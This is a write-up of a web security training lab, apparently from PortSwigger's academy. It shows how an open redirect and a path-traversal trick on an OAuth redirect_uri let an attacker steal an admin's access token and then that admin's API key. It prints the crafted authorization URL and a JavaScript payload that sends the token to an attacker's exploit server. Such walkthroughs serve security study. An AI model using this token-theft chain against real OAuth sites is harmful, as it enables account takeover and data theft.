# Stealing OAuth access tokens via an open redirect
* This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak acces token to arbitrary pages on the client application.
	* To solve the lab, identify an open redirect on the blog website and use this to steal an access toekn for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
	* The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
	* You can log in via your won social media account using the following credentials: `wiener: peter`
### 1. Enumerate the web page
* When click "My account", the page is redirected to a social media login page.

![14](https://user-images.githubusercontent.com/53956303/156851721-6108ab6f-78ae-4745-8f1b-e0a1877e231e.png)
* Login as "wiener:peter".
	* The page returns a authorization page.

![15](https://user-images.githubusercontent.com/53956303/156851801-8d0d8130-84f5-412a-9393-b68cef3729af.png)
* when click "Continue", successfully logged in with the social media account.

![16](https://user-images.githubusercontent.com/53956303/156851907-2bdab32b-cd9f-4254-bfc8-48797b62b0ec.png)
### 2. Enumerate reqeusts using Burp HTTP history
* From the social media login, a `GET /auth` request is made first.
	* It has `redirect_uri` to `/oauth-callback`.

![17](https://user-images.githubusercontent.com/53956303/156858496-ee34171e-3ab3-4201-93d8-7d8fc7563d0d.png)
### 3. Try to modfy the `redirect_uri`
* Try to supply an external uri `test.com`

![26](https://user-images.githubusercontent.com/53956303/156858603-978a134e-ec42-4d5c-82c5-1663c8d75144.png)
* The external domain is being validated against whitelist.

### 4. Test using Directory traversal sequence
* Log out and capture the reqeust again when log in using the social media account.
	* Then, use directory traversal sequences to set the `redirect_uri` to a post
```http
redirect_uri=https://ac981fac1f5eaa03c232439c0040006b.web-security-academy.net/oauth-callback/../post?postId=1
```
* When forward the reqeust, the page is redirected to a post.

![27](https://user-images.githubusercontent.com/53956303/156858888-97ea49f7-88c4-48d7-8cec-ba5c07a37696.png)
* However, in the URL, the access token is included as a fragment.

![28](https://user-images.githubusercontent.com/53956303/156858943-f0e22f72-70d0-4fd6-8804-3f10df038122.png)
### 5. Enumerate "Next Post" button on a post
* A next Post button is found from a post, try to enumerate the "Next post" function to abuse using Burp

![29](https://user-images.githubusercontent.com/53956303/156859080-02f8d0e7-e3e4-4ea6-8cae-bbb2abaf2c0a.png)
* It contains a `path` paramter. That is an open redirect, so an attacker can supply an absolute address.
	* It means that an external domain also can be supplied. This can be used like this. Use directory traversal sequnce to point "Next post" function's "path" parameter to supply exploit server's address to `redirect_uri`.
```http
https://oauth-ac0d1f4d1fc1aa2cc252432502cc0091.web-security-academy.net/auth?client_id=wedca5qvc5c48ypel6720&redirect_uri=https://ac981fac1f5eaa03c232439c0040006b.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac9c1f951f1daa32c22143ed01690085.web-security-academy.net/exploit&response_type=token&nonce=1144944458&scope=openid%20profile%20email
```
* Test this by visitng the address.
	* The exploit is successfully worked!

![30](https://user-images.githubusercontent.com/53956303/156859543-88489882-57ef-40f6-a8cf-6928aee991f8.png)
### 6. Create a malicious URL and to execute a script to steal a cookie
```javascript
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-ac0d1f4d1fc1aa2cc252432502cc0091.web-security-academy.net/auth?client_id=wedca5qvc5c48ypel6720&redirect_uri=https://ac981fac1f5eaa03c232439c0040006b.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac9c1f951f1daa32c22143ed01690085.web-security-academy.net/exploit&response_type=token&nonce=1144944458&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
* Store, view exploit and use access log to identify if the exploit works well.

![31](https://user-images.githubusercontent.com/53956303/156859843-e9ad7964-8170-44c1-a250-a29af737187f.png)
* Successfully obtain the token!
	* Deliver the exploit to admin to get the admin token.

![32](https://user-images.githubusercontent.com/53956303/156859911-21f1978c-14fe-43eb-ad41-ca534f9f8bb4.png)
* Admin token is successfully obtained.

### 7. make a API call
* Since the `/oauth-callback` reveals some requirements, use it to construct an API call.

![33](https://user-images.githubusercontent.com/53956303/156860069-ce593f47-459a-4f2a-957b-5908cd5c4f57.png)
* Replace the token with obatined admin token on `GET /me` which is mentioned on the `/oauth-callback` request.

![34](https://user-images.githubusercontent.com/53956303/156860274-c859b183-14ab-4b6f-b44d-edc5ca19c45a.png)
* As a result, the admin API key is given. By submitting the API key, the lab is solved.

![35](https://user-images.githubusercontent.com/53956303/156860296-fa683b43-0edc-427c-8a9f-16385a68f4f1.png)
